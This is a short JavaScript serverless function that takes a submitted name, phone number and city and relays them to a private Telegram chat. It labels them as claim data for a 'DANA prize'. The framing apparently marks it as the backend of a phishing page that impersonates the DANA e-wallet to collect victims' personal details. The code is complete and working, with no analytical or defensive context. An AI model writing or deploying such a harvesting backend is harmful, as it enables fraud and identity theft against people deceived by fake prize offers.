const axios = require('axios');

exports.handler = async function(event, context) {
  // Only allow POST requests
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      body: JSON.stringify({ error: 'Method not allowed' })
    };
  }

  try {
    // Parse the JSON body
    const data = JSON.parse(event.body);
    const { nama, hp, kota } = data;

    // Validate required fields
    if (!nama || !hp || !kota) {
      return {
        statusCode: 400,
        body: JSON.stringify({ error: 'Missing required fields: nama, hp, kota' })
      };
    }

    // Replace with your actual Telegram bot token and chat ID
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      return {
        statusCode: 500,
        body: JSON.stringify({ error: 'Telegram configuration missing' })
      };
    }

    // Format message for Telegram
    const message = `📋 *DATA KLAIM HADIAH DANA* 📋\n
✨ *Nama Lengkap:* ${nama}
📱 *Nomor HP:* ${hp}
🏙️ *Kota/Kabupaten:* ${kota}
⏰ *Waktu:* ${new Date().toLocaleString('id-ID')}
    
_Data klaim hadiah DANA telah diterima_`;

    // Send message to Telegram
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    const response = await axios.post(telegramUrl, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'Markdown'
    });

    return {
      statusCode: 200,
      body: JSON.stringify({ 
        success: true, 
        message: 'Data berhasil dikirim ke Telegram',
        telegramResponse: response.data 
      })
    };

  } catch (error) {
    console.error('Error sending data to Telegram:', error);
    
    return {
      statusCode: 500,
      body: JSON.stringify({ 
        error: 'Failed to send data to Telegram',
        details: error.message 
      })
    };
  }
};
